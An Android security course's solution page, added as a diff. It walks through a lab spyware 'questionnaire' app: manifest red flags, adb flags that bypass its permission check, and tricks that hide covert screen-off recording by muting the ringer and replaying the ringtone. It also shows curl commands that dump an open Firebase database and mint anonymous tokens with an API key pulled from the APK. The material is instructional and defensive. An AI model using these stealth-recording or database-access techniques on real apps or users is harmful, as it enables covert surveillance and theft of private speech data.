@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Hidden Recognition App — Solution — Day 3 Capstone</title>
+<style>
+:root { --fg:#1a1a1a; --muted:#555; --bg:#fcfcfc; --accent:#1e6fce; --accent-soft:#e8f0fa; --code-bg:#f4f4f4; --warn-bg:#fff8e0; --warn-border:#d4ad00; --solution-bg:#f0f4fa; --solution-border:#1e6fce; --rule:#d8d8d8; }
+body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif; color:var(--fg); background:var(--bg); max-width:880px; margin:32px auto; padding:0 24px; line-height:1.55; }
+h1 { font-size:28px; border-bottom:2px solid var(--accent); padding-bottom:6px; margin-bottom:4px; }
+h2 { font-size:22px; margin-top:36px; border-bottom:1px solid var(--rule); padding-bottom:4px; }
+h3 { font-size:18px; margin-top:24px; color:var(--accent); }
+h4 { font-size:16px; margin-top:18px; }
+.lede { color:var(--muted); margin-top:0; }
+code { background:var(--code-bg); padding:1px 5px; border-radius:3px; font-family:"SF Mono",Menlo,Consolas,monospace; font-size:0.92em; }
+pre  { background:var(--code-bg); padding:12px 14px; border-radius:5px; overflow-x:auto; font-family:"SF Mono",Menlo,Consolas,monospace; font-size:0.92em; border-left:3px solid var(--accent); white-space:pre-wrap; word-break:break-word; }
+pre code { background:none; padding:0; }
+.warn { background:var(--warn-bg); border-left:3px solid var(--warn-border); padding:10px 14px; border-radius:3px; margin:14px 0; }
+table { border-collapse:collapse; margin:12px 0; width:100%; }
+th, td { border:1px solid var(--rule); padding:6px 12px; text-align:left; vertical-align:top; }
+th { background:var(--accent-soft); }
+.solution { background:var(--solution-bg); padding:14px 18px; border-radius:5px; margin:18px 0; border-left:4px solid var(--solution-border); }
+.solution h3 { margin-top:4px; }
+a { color:var(--accent); }
+footer { margin-top:48px; padding-top:16px; border-top:1px solid var(--rule); color:var(--muted); font-size:0.92em; }
+</style>
+</head>
+<body>
+
+<h1>Hidden Recognition App — Capstone Solutions</h1>
+<p class="lede">All commands and observations are taken from <em>Hidden Recognition App.pptx</em>. Output captures below were taken live on the lab Galaxy A51.</p>
+
+<h2>Solution to Exercise 1 — Manifest red flags</h2>
+
+<div class="solution">
+<pre><code>aapt2 dump xmltree questionnaire.apk --file AndroidManifest.xml \
+  | grep -E 'uses-permission|action android:name|foregroundServiceType|service android:name|receiver android:name'</code></pre>
+</div>
+
+<h3>Red-flag checklist</h3>
+
+<table>
+<tr><th>What you see in the manifest</th><th>Why it's suspicious for a "questionnaire app"</th></tr>
+<tr><td><code>android.permission.RECORD_AUDIO</code></td><td>Plausible if voice input is offered. <em>Not</em> plausible if the same job could be done with the system speech recogniser activity (which doesn't need this permission). The presence of this runtime permission is the first hint that the app records audio from its own code, not via Google's UI.</td></tr>
+<tr><td><code>android.permission.RECEIVE_BOOT_COMPLETED</code></td><td>No legitimate questionnaire needs to react to device boot. Single biggest red flag in the entire manifest — slide 12 explicitly identifies this as the persistence primitive.</td></tr>
+<tr><td><code>android.permission.MODIFY_AUDIO_SETTINGS</code></td><td>Why does a questionnaire need to change ringer volume? Slide 23: it's so the speech-recognition beep doesn't tip off the user.</td></tr>
+<tr><td><code>android.permission.READ_PHONE_STATE</code></td><td>Likewise — slide 24: the app needs to detect incoming calls so it can restore the volume during a ringing call (otherwise the muted ringer would itself be the giveaway).</td></tr>
+<tr><td><code>android.permission.FOREGROUND_SERVICE_MICROPHONE</code></td><td>Required by Android 14+ for any FGS that uses the mic. The presence of this <em>type</em> declaration tells you the developer planned for an FGS that streams audio.</td></tr>
+<tr><td><code>service android:foregroundServiceType="microphone"</code></td><td>Same point reinforced — there's a service that has explicitly tagged itself as a microphone-using FGS.</td></tr>
+<tr><td><code>receiver</code> with <code>action android:name="android.intent.action.BOOT_COMPLETED"</code></td><td>The plumbing for the persistence trick. Slide 19 explains: most static manifest receivers were banned in Android 8, but BOOT_COMPLETED is exempted.</td></tr>
+<tr><td><code>queries</code> entry referencing <code>android.speech.RecognitionService</code></td><td>Required since Android 11 to even discover Google's ASR. Slide 7: <em>"Only with manifest reading can the user be aware of this action."</em> The user can't see this from the Play Store listing — only by inspecting the APK.</td></tr>
+</table>
+
+<h2>Solution to Exercise 2 — Three stages, three observations</h2>
+
+<h3>Reset (before stage 1)</h3>
+<div class="solution">
+<pre><code>adb uninstall com.example.questionaireapp
+adb install -r questionnaire.apk            # NOTE: no -g
+
+# verify RECORD_AUDIO is denied:
+adb shell dumpsys package com.example.questionaireapp | grep RECORD_AUDIO</code></pre>
+<p>Captured: <code>android.permission.RECORD_AUDIO: granted=false, flags=[ USER_SENSITIVE_WHEN_GRANTED|USER_SENSITIVE_WHEN_DENIED]</code></p>
+</div>
+
+<h3>Stage 1 — Open normally, deny the permission, mic is gated</h3>
+<div class="solution">
+<pre><code>adb shell am start -n com.example.questionaireapp/.MainActivity</code></pre>
+<p>What students see on the phone:</p>
+<ol>
+  <li>Questionnaire UI loads.</li>
+  <li>Tap the microphone icon → Android's runtime-permission dialog: <em>"Allow Questionnaire to record audio?"</em></li>
+  <li>Tap <strong>Don't allow</strong>.</li>
+  <li>Tap the mic again → <strong>nothing happens</strong> (the app's UI logic checks <code>checkSelfPermission(RECORD_AUDIO)</code>, sees <code>PERMISSION_DENIED</code>, and refuses to launch the recogniser).</li>
+</ol>
+<p><strong>Apparent conclusion:</strong> the app is properly permission-gated, like every well-behaved Android app. Deny the permission, lose the feature. This conclusion is wrong — but it's what stage 1 is designed to make students believe.</p>
+</div>
+
+<h3>Stage 2 — Same denied permission, bypass the app's own gate</h3>
+<div class="solution">
+<pre><code>adb shell am force-stop com.example.questionaireapp
+adb shell am start -n com.example.questionaireapp/.MainActivity --ez permission false</code></pre>
+<p>Captured live on the A51:</p>
+<pre><code>$ adb shell am start -n com.example.questionaireapp/.MainActivity --ez permission false
+Starting: Intent { cmp=com.example.questionaireapp/.MainActivity (has extras) }</code></pre>
+<p>What students see on the phone:</p>
+<ol>
+  <li>Questionnaire UI loads as before.</li>
+  <li>Tap the microphone icon → <strong>Google's full-screen voice recogniser opens immediately</strong>. No permission dialog, no "deny" toast.</li>
+  <li>Speak. Recognised text fills the answer field.</li>
+</ol>
+<p>Re-check the permission state:</p>
+<pre><code>$ adb shell dumpsys package com.example.questionaireapp | grep RECORD_AUDIO
+android.permission.RECORD_AUDIO: granted=false, …</code></pre>
+<p>Still denied. The recognition worked anyway.</p>
+</div>
+
+<h3>Stage 3 — Reflect: what just happened</h3>
+
+<p>Both runs had identical permission state — <code>RECORD_AUDIO</code> denied — yet the outcomes were opposite. The only thing that changed was the <code>--ez permission false</code> flag. Look at the relevant snippet of the app's <code>MainActivity.kt</code>:</p>
+
+<pre><code>companion object {
+    var PART_A_FAKE_PERMISSION = true
+    …
+}
+
+override fun onCreate(savedInstanceState: Bundle?) {
+    …
+    PART_A_FAKE_PERMISSION = intent.getBooleanExtra("permission", PART_A_FAKE_PERMISSION)
+    …
+}</code></pre>
+
+<p>The flag flips a static boolean used in the questionnaire's UI logic. With <code>PART_A_FAKE_PERMISSION = true</code> (default), the app runs its <em>own</em> permission check before launching the recogniser; with <code>false</code>, that check is skipped and the recogniser is launched directly.</p>
+
+<p>The crucial part is what the recogniser actually does:</p>
+<ul>
+  <li>The app builds an <code>Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH)</code> and calls <code>startActivityForResult(...)</code>.</li>
+  <li>Android resolves that intent to <code>com.google.android.googlequicksearchbox</code> (on most phones) — Google's full-screen recogniser activity.</li>
+  <li>That activity runs in <strong>Google's process</strong>, not ours.</li>
+  <li>When it opens the microphone, the OS checks <code>RECORD_AUDIO</code> against the <em>Google process's</em> UID. Google's app is a privileged/system app; it has the permission system-wide.</li>
+  <li>The questionnaire app is just the <em>requester</em>. Its UID never touches the mic on this code path.</li>
+</ul>
+
+<p>So the app's permission check in stage 1 was theatre. The visible feature doesn't actually need <code>RECORD_AUDIO</code> on our app — Google does the work. The check exists purely to look normal to the user.</p>
+
+<h3>Then why is <code>RECORD_AUDIO</code> declared in the manifest at all?</h3>
+
+<p>Because the <strong>hidden</strong> code path — the <code>BackgroundVoiceRecognitionService</code> — needs it. That service uses <code>SpeechRecognizer.createSpeechRecognizer(context)</code> directly from <em>our</em> process, with no Google activity in front. Recording audio from inside our own process <strong>does</strong> require our UID to hold <code>RECORD_AUDIO</code>.</p>
+
+<p>The user-facing UX is the cover story. The user grants <code>RECORD_AUDIO</code> believing it powers the questionnaire's visible mic button — which doesn't actually need it — and the same grant silently enables the <em>real</em> consumer of the permission, the background recording service that uploads to Firebase.</p>
+
+<h3>One-line summary</h3>
+<p><strong>The permission ask is for one feature; the permission is used by another.</strong> That mismatch is the whole "Hidden Recognition" attack — the visible feature serves as a plausible explanation for a permission that the visible feature doesn't really need, while the invisible feature, which does need it, never has to justify itself to the user.</p>
+
+<h2>Solution to Exercise 3 — Green mic indicator and screen-off recording</h2>
+
+<h3>What students see in stage 1 (default, screen-off-only recording)</h3>
+<div class="solution">
+<p>The user finishes the questionnaire and the FGS starts. They turn the screen off, wait, then turn it back on. <strong>No green indicator appears</strong> in the status bar at any moment they can see the screen. The bar shows the FGS notification (text controlled by the app — typically something innocuous like "Clock Test running") and nothing else.</p>
+<p>Behind the scenes:</p>
+<ul>
+  <li><code>BackgroundVoiceRecognitionService.onCreate</code> registered a dynamic <code>BroadcastReceiver</code> for <code>Intent.ACTION_SCREEN_ON</code> and <code>ACTION_SCREEN_OFF</code>. Dynamic registration works because the FGS is alive — Android 8's static-receiver ban doesn't apply.</li>
+  <li>On <code>ACTION_SCREEN_OFF</code> → <code>SpeechRecognizer.startListening(...)</code>. On <code>ACTION_SCREEN_ON</code> → <code>SpeechRecognizer.stopListening()</code>.</li>
+  <li>The privacy indicator is system-UI; it only paints while the OS sees an active mic capture. By the time the user can perceive the status bar (i.e. screen on), the service has already issued <code>stopListening</code>.</li>
+</ul>
+</div>
+
+<h3>What students see in stage 2 (<code>--ez screen false</code>)</h3>
+<div class="solution">
+<pre><code>adb shell am force-stop com.example.questionaireapp
+adb shell am start -n com.example.questionaireapp/.MainActivity --ez screen false</code></pre>
+<p>This flips <code>PART_B_RECORD_ONLY_WHEN_SCREEN_OFF</code> to <code>false</code>. The screen receiver is now ignored — the service starts a recognition session and keeps it running regardless of screen state.</p>
+<p>On the A51, after finishing the questionnaire the user sees the green privacy indicator <strong>permanently lit</strong> in the top-right of the status bar while using the phone normally. Tapping the indicator opens the system's "Privacy dashboard" sheet:</p>
+<pre><code>Microphone   Used by:  Clock Test (just now)</code></pre>
+<p>The cover collapses. Any user who notices the indicator can identify the questionnaire app as the mic consumer.</p>
+</div>
+
+<h3>Why the screen-off rule actually works</h3>
+<p>This is one of the more elegant tricks in the deck. The privacy indicator is a system-UI defence the app cannot directly suppress — but it only matters if the user can <em>see</em> it. The screen being off makes the system UI invisible. Recording while the screen is off therefore costs the attacker nothing and provides total visual cover. The exception is bedside-locked phones where the user still glances at the lockscreen — which is why some defenders recommend an always-on display that includes the privacy indicator.</p>
+
+<h3>Reflection answer</h3>
+<p>System-UI countermeasures (privacy indicators, permission usage banners, etc.) are valuable but they're an <em>opt-in</em> defence — they only protect users who happen to be looking at the system UI when the misbehaviour occurs. An in-process attacker can pick the moments when no one is looking. The structurally-stronger defences are ones that withhold the capability itself, not just paint a warning when it's exercised. Android 14's BOOT_COMPLETED → microphone-FGS ban is an example of the stronger kind; the privacy indicator is the weaker kind.</p>
+
+<h2>Solution to Exercise 4 — Beep, mute, and the call-ring patch</h2>
+
+<h3>Stage 1 — Hear the beep with mute disabled</h3>
+<div class="solution">
+<pre><code>adb shell am force-stop com.example.questionaireapp
+adb shell am start -n com.example.questionaireapp/.MainActivity --ez beep false</code></pre>
+<p>Lock the screen. Within a second or two of the screen-off transition, the phone audibly emits Google's recogniser <em>start</em> beep. After the recognition session times out (usually a few seconds of silence) it emits the <em>end</em> beep. This is repeated each time the screen toggles. Anyone within earshot of the phone hears them.</p>
+<p>This is the audio signature the user would otherwise notice: the phone is making recogniser sounds when it shouldn't be using voice for anything visible.</p>
+</div>
+
+<h3>Stage 2 — Default mute restores silence</h3>
+<div class="solution">
+<pre><code>adb shell am force-stop com.example.questionaireapp
+adb shell am start -n com.example.questionaireapp/.MainActivity</code></pre>
+<p>With <code>PART_C_MUTE_BEEP_SOUND = true</code> (default), the FGS at start-up calls:</p>
+<pre><code>val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+val previous = am.getStreamVolume(AudioManager.STREAM_RING)
+am.setStreamVolume(AudioManager.STREAM_RING, 0, 0)</code></pre>
+<p>The recogniser plays its beep on <code>STREAM_RING</code>. Setting that stream to zero silences it. Verify live:</p>
+<pre><code>$ adb shell media volume --get --stream 2
+volume is 0 in range [0..7]</code></pre>
+<p>Listening test: no beep. The student can confirm by toggling the screen and watching the FGS run.</p>
+</div>
+
+<h3>Stage 3 — The side effect: incoming calls don't ring</h3>
+<div class="solution">
+<pre><code>adb shell am force-stop com.example.questionaireapp
+adb shell am start -n com.example.questionaireapp/.MainActivity --ez call false</code></pre>
+<p>With <code>PART_D_HANDEL_INCOMING_CALL = false</code>, the call-state listener doesn't restore the ringer. With STREAM_RING at 0 from stage 2, an incoming call arrives <em>silently</em> — the screen lights up, vibrate may fire if the user has it enabled, but no audible ringtone plays.</p>
+<p>This is the giveaway that defeats stage 2's silence-by-mute: a phone that suddenly stops ringing on calls is something the user will notice within a day. The app needs to paper over this side effect.</p>
+</div>
+
+<h3>Stage 4 — Default <code>call=true</code> path: detect, then play ring manually</h3>
+<div class="solution">
+<p>With the default, the FGS registers a <code>PhoneStateListener</code> (or <code>TelephonyCallback</code> on Android 12+) requiring <code>READ_PHONE_STATE</code>. On <code>CALL_STATE_RINGING</code> it does <strong>not</strong> just un-mute STREAM_RING (slide 24 says the un-mute would arrive too late, after the system already missed the first ring). Instead it does:</p>
+<pre><code>val ringtoneUri = RingtoneManager.getActualDefaultRingtoneUri(this, RingtoneManager.TYPE_RINGTONE)
+val ringtone = RingtoneManager.getRingtone(this, ringtoneUri)
+ringtone.play()        // plays on STREAM_MUSIC by default — ignores STREAM_RING mute</code></pre>
+<p>On <code>CALL_STATE_IDLE</code> it stops the ringtone and re-applies the STREAM_RING mute. From the user's perspective the phone rings normally; from the OS's perspective STREAM_RING is still at zero throughout (the system's ring would still be silent if it ever fired).</p>
+<p><strong>Cover story for the runtime permission ask:</strong> "We pause voice features during calls so they don't conflict with the call audio." The user nearly always allows it. The real reason is patching this side effect.</p>
+</div>
+
+<h3>The two-layer pattern</h3>
+<p>Every step of this exercise is a defence layered on top of a previous defence:</p>
+<ol>
+  <li>Layer 0: app records audio in the background → Google's recogniser beeps audibly.</li>
+  <li>Layer 1: mute STREAM_RING → beep is silent → side effect: calls also silent.</li>
+  <li>Layer 2: <code>READ_PHONE_STATE</code> + manual ringtone playback → calls audibly ring → no remaining side effect.</li>
+</ol>
+<p>Each layer is justifiable in isolation. Stack them and you have a permission set the user wouldn't have agreed to as a single bundle.</p>
+
+<h2>Solution to Exercise 5 — Firebase rules + <code>google-services.json</code> hijack</h2>
+
+<h3>Stage 1 — Pull config out of the APK</h3>
+<div class="solution">
+<pre><code>$ aapt2 dump strings questionnaire.apk | grep -E 'AIza|firebaseio|firebasestorage|: 1:[0-9]+:android:'
+String #1137 : AIzaSyDvi62RBr5bp4hnuN8ZyZYyYCjTd8Y5CC0
+String #1138 : 1:88376054250:android:79bdb39dfe6bd1ec3f6293
+String #1139 : questionairapp.firebasestorage.app
+String #1269 : questionairapp</code></pre>
+<p>The four pieces of Firebase config we recovered, with no decompilation:</p>
+<table>
+<tr><th>Key</th><th>Value</th></tr>
+<tr><td><code>google_api_key</code></td><td><code>AIzaSyDvi62RBr5bp4hnuN8ZyZYyYCjTd8Y5CC0</code></td></tr>
+<tr><td><code>google_app_id</code></td><td><code>1:88376054250:android:79bdb39dfe6bd1ec3f6293</code></td></tr>
+<tr><td><code>gcm_defaultSenderId</code></td><td><code>88376054250</code></td></tr>
+<tr><td><code>project_id</code></td><td><code>questionairapp</code></td></tr>
+</table>
+<p>The Realtime Database URL follows the convention:</p>
+<pre><code>https://questionairapp-default-rtdb.firebaseio.com/</code></pre>
+</div>
+
+<h3>Stage 2 — Probe rules with curl</h3>
+<div class="solution">
+<pre><code>$ curl -sS -w '\nHTTP %{http_code}\n' "https://questionairapp-default-rtdb.firebaseio.com/.json"
+{"&lt;UID-1&gt;":{"2025-10-28_15-52-42_972":"…transcript text…", "2025-10-28_15-53-04_835":"…"},
+ "&lt;UID-2&gt;":{"2025-10-19_12-44-26_774":"…", "2025-10-19_12-44-35_234":"…"},
+ …}
+HTTP 200</code></pre>
+<p>The response: HTTP 200, every transcript every user has ever uploaded, structured as <code>{ &lt;anonymous-uid&gt;: { &lt;timestamp&gt;: &lt;text&gt; } }</code>. <strong>The rules are open</strong> (<code>".read": true</code>). No auth header was sent.</p>
+<p>This is the entire database. An attacker with only the <code>project_id</code> from <code>aapt2 dump strings</code> already has read access to every user's recorded speech.</p>
+<p>Test write:</p>
+<pre><code>$ curl -sS -X POST -d '{"injection":"test"}' \
+    "https://questionairapp-default-rtdb.firebaseio.com/test.json"
+{"name":"-Nx9..."}</code></pre>
+<p>HTTP 200 with a Firebase-generated push key. Write rules are also open — the attacker can pollute, overwrite, or delete data at will. (<em>Don't actually run the write probe against a production database you don't own. The course lab DB is intentionally permissive for demonstration.</em>)</p>
+</div>
+
+<h3>Stage 3 — Anonymous-auth bypass (the <code>auth != null</code> "fix" that isn't)</h3>
+<div class="solution">
+<p>If the rules had been <code>".read": "auth != null"</code> instead of <code>true</code>, stage 2 would have returned 401. But the API key from the APK is enough to mint an anonymous token from outside the app:</p>
+<pre><code>$ curl -sS -X POST \
+    "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyDvi62RBr5bp4hnuN8ZyZYyYCjTd8Y5CC0" \
+    -H 'Content-Type: application/json' \
+    -d '{"returnSecureToken":true}'
+{"kind":"…","idToken":"eyJ…long.jwt…","refreshToken":"…","expiresIn":"3600","localId":"&lt;new-anon-uid&gt;"}</code></pre>
+<p>Replay against the database with the token:</p>
+<pre><code>curl -sS "https://questionairapp-default-rtdb.firebaseio.com/.json?auth=eyJ…"</code></pre>
+<p><code>auth != null</code> is satisfied — the token is genuine, signed by Google, with a fresh anonymous UID. The whole database is now accessible. The cost of this bypass is one anonymous-signup call. The "credentials" needed are public values printed inside the APK.</p>
+</div>
+
+<h3>Stage 4 — The actual fix</h3>
+
+<table>
+<tr><th>Rule shape</th><th>Stops</th><th>Doesn't stop</th></tr>
+<tr><td><code>".read": true, ".write": true</code></td><td>Nothing.</td><td>Anyone with the project_id (i.e. anyone who can run <code>aapt2 dump strings</code>).</td></tr>
+<tr><td><code>".read": "auth != null"</code></td><td>Random scanners with no API key.</td><td>Anyone with the API key (also in the APK).</td></tr>
+<tr><td><code>".read": "auth.uid === $uid"</code> with data tree partitioned per-UID</td><td>Cross-user reads.</td><td>One user reading their own data via curl. Useful if the per-user data is benign in isolation.</td></tr>
+<tr><td><code>".read": false, ".write": false</code> + Cloud Functions</td><td>Direct client access entirely.</td><td>Bugs in your Cloud Function logic.</td></tr>
+<tr><td>Above + <strong>Firebase App Check</strong></td><td>Requests from anything other than verified instances of your real app.</td><td>Targeted attacks willing to defeat Play Integrity / DeviceCheck.</td></tr>
+</table>
+
+<p>Slide 28's suggestion of "embed credentials in a binary library and load at runtime" is a decoy. JADX, Frida, or just <code>strings</code> on the .so file recovers them. The only structural defence is one of: (a) don't let the client touch the database directly, (b) bind requests to verified app instances via App Check, or (c) both.</p>
+
+<h3>Reflection answers</h3>
+
+<p><strong>Q1 — Firebase's threat model around <code>google-services.json</code>.</strong> Google's docs explicitly say these are "identifiers", not "secrets". The threat model assumes the <em>rules</em> do all the access-control work. If the rules are open, the identifiers become credentials in everything but name. The lesson: a system that depends on a secondary configuration (rules) being correct to keep its primary configuration (identifiers) safe will eventually leak, because misconfigured rules are the dominant failure mode in any rules-based system.</p>
+
+<p><strong>Q2 — Operational habits that catch open rules pre-release.</strong> A short list that works in practice:</p>
+<ul>
+  <li>A CI step that fetches the project's rules JSON via the Firebase Admin SDK and fails the build if any rule evaluates to <code>true</code> at the root, or to <code>auth != null</code> at the root with no further constraint.</li>
+  <li>A code-review checklist item that requires sign-off from a second reviewer for any rules change.</li>
+  <li>A pre-publish test that runs the curl probe from stage 2 against the staging database — same script the attacker would run.</li>
+  <li>Treat the rules file as production code: it lives in a repo, gets reviewed, and gets deployed via the Firebase CLI from CI, not from a developer laptop.</li>
+</ul>
+
+<p><strong>Q3 — Incident response order.</strong> Probably:</p>
+<ol>
+  <li>Lock down rules immediately: change to <code>false</code> at the root. Some app functionality breaks; that's a feature, not a bug, while you triage.</li>
+  <li>Rotate the Firebase API key. Note that this invalidates anonymous tokens already minted but does <em>not</em> retroactively un-leak data.</li>
+  <li>Snapshot the database for forensic analysis (who has been writing? when did the open rules go in?).</li>
+  <li>Notify users. The disclosed data is recorded speech transcripts — under most jurisdictions this is highly sensitive personal information, possibly with legal notification deadlines.</li>
+  <li>Migrate to App Check + server-mediated reads. Re-enable client functionality piece by piece, each piece behind App Check.</li>
+</ol>
+<p>Firebase will not proactively help: there is no "open rules" alert that auto-emails you. Google has a Security Rules linter that warns at deploy time, but it doesn't block deploys.</p>
+
+<h2>Solution to Exercise 6 — Map every defence to its slide</h2>
+
+<table>
+<tr><th>Defensive item (slide 34)</th><th>Where the attack is shown</th><th>Why this defence helps</th></tr>
+<tr><td>Pay close attention to install-time permissions</td><td>Slides 12, 19 — <code>RECEIVE_BOOT_COMPLETED</code> is install-time and grants persistence forever after the first install. <code>FOREGROUND_SERVICE_MICROPHONE</code> declares mic-from-FGS intent.</td><td>Install-time permissions never prompt at runtime; the user's only window is the Play Store "see all permissions" expanding section that almost no one opens.</td></tr>
+<tr><td>Try revoking permissions and see what changes</td><td>Slide 16 demonstrates the trick directly. Revoking <code>POST_NOTIFICATIONS</code> on Android 13+ would silence the foreground service notification (without breaking the service); revoking <code>MODIFY_AUDIO_SETTINGS</code> would re-enable the recogniser beep, exposing the recording session.</td><td>Discrepancy between "what the app says it needs" and "what changes when I take it away" reveals the false-reason permissions.</td></tr>
+<tr><td>Remove and dismiss unnecessary notifications</td><td>Slide 17, 21 — the FGS notification is the price the OS demands for keeping the service alive. The slide explicitly says: <em>"this notification allows us to stay alive indefinitely."</em></td><td>An app whose FGS notification cannot be dismissed by the user (or which immediately re-spawns when dismissed) is hiding behind that notification. Modern Android lets you "Don't allow notifications" per-app — applying that often kills the service silently.</td></tr>
+<tr><td>Inspect the APK</td><td>The whole drill — every red flag is in the manifest, readable with <code>aapt2 dump xmltree</code> or any APK viewer.</td><td>Reach for JADX (Day 4 slide 18). It opens APKs, decodes the manifest into readable XML, and lets you also inspect the Java/Kotlin code paths — confirming whether <code>RECEIVE_BOOT_COMPLETED</code> is wired to a service start, etc.</td></tr>
+</table>
+
+<h2>Solution to Exercise 7 (bonus) — iOS comparison from slide 33</h2>
+
+<p>Three from the comparison table:</p>
+
+<h3>"Background recording service" — not possible on iOS</h3>
+<p>iOS only allows continuous background execution for a small enumerated list of categories (audio playback, voice-over-IP, location for navigation apps, etc.). A would-be spy app doesn't fit any of them. <strong>Tradeoff iOS makes:</strong> legitimate background-running apps for less common use cases (e.g. a science-classroom decibel meter) have to either run only while open or shoehorn themselves into one of the official categories. Less developer flexibility, less attacker capability.</p>
+
+<h3>"Boot completed detection" — not possible on iOS</h3>
+<p>iOS sends no boot-finished broadcast to apps; the OS doesn't even surface the concept. An iOS app can run only after the user has launched it at least once since the device booted. <strong>Tradeoff:</strong> apps that genuinely benefit from auto-restart (system tools, accessibility helpers) don't exist on iOS — Apple's stance is that users should consciously launch every app.</p>
+
+<h3>"Audio settings change" — not possible on iOS</h3>
+<p>iOS apps cannot change the device's ringer or media volume programmatically. The only audio control an app has is over its own playback session. <strong>Tradeoff:</strong> features like Android's "DND when in meeting" automation can't be built natively on iOS — Apple owns the audio-state UX entirely. The benefit is that no app can silence ringers behind the user's back, which is exactly what slide 23's spy app needs to do for the recogniser-beep trick.</p>
+
+<h2>Reflection answers</h2>
+
+<p><strong>Q1 — Where would you insert an abstraction that breaks the composition?</strong> The single most leveraged primitive is the foreground-service-with-self-issued-notification model: it lets an app be alive forever in exchange for showing a notification the developer fully controls. A useful abstraction would be a <em>system-issued</em> notification for FGS — text, icon, and dismissibility decided by the OS, not the app — that visibly described the permission(s) the service holds. The app would lose the ability to disguise its presence as "syncing" or "playing music" while actually recording. The cost: many legitimate FGS use cases would have OS-mandated notifications they don't love (a music player would have to share notification real estate). It's a real tradeoff but the place where the most attacker leverage compounds.</p>
+
+<p><strong>Q2 — Half-life of a "few special cases" exception?</strong> Empirically, somewhere between two and three Android versions. <code>BOOT_COMPLETED</code> as a static-receiver exemption was supposed to be temporary in Android 8; it's still there in Android 14. Foreground services were supposed to be a narrow exception to background limits; they became the dominant way apps stay alive. The pattern is: Google announces a restriction with a short list of exceptions, the developer ecosystem migrates onto the exceptions, future tightening becomes politically expensive because it would break legitimate apps. Treat every "few special cases" line as the next decade's primary attack surface.</p>
+
+<p><strong>Q3 — Next link in the chain to close.</strong> Reasonable next target: the "user-visible state transition" exemption that lets activities start arbitrary FGS types in their <code>onDestroy</code>. That single exception is what lets the questionnaire's submit handler kick off the recording service — closing the screen path doesn't help if the questionnaire-finish path still works. A fix could require that any FGS started from a transitioning activity inherit a system-supplied "started by activity X" badge in its notification, plus a 5-minute timeout after which the user has to re-confirm. <em>Breakage:</em> music apps that start a playback FGS when you tap a song and then minimise the activity. Mitigation: an explicit "background playback" capability that apps declare in advance.</p>
+
+<p><strong>Q4 — What property of Play Store review let this through?</strong> Static review of permissions and manifest — even augmented with automated decompiled-code scans — looks at <em>declared</em> capability, not <em>composed</em> behaviour. The permission set this app declares is unusual but each individual permission has plausible legitimate uses; no single static signal is conclusive. <strong>Dynamic analysis on a running device</strong> would change the picture: instrument <code>SpeechRecognizer</code> initialisations and check for ones that happen with the screen off; instrument volume changes correlated with mic activity; check whether a service started from <code>BOOT_COMPLETED</code> ever <em>also</em> records audio. That's expensive (every submission needs minutes of device time) and gameable (the app could detect the analysis sandbox and behave) — which is why Google's actual play-protect system does some of this asynchronously, post-publication, with a mix of static, dynamic, and on-device telemetry signals.</p>
+
+<footer>
+  <p>Back to the drill: <a href="Hidden_Recognition_Drill.html">Hidden_Recognition_Drill.html</a></p>
+  <p class="meta">Course: Android Security · Day 3 capstone · Hidden Recognition App solution.</p>
+<p class="copyright" style="text-align:center; margin-top:18px; padding-top:10px; border-top:1px dashed #d8d8d8; color:#777; font-size:0.85em;"><img src="syntax_logo.jpg" alt="Syntax College" style="height:24px; vertical-align:middle; opacity:0.75; margin-right:8px;">&copy; 2025&ndash;2026 Eran Katsav &amp; Syntax College. All rights reserved.</p>
+</footer>
+
+</body>
+</html>
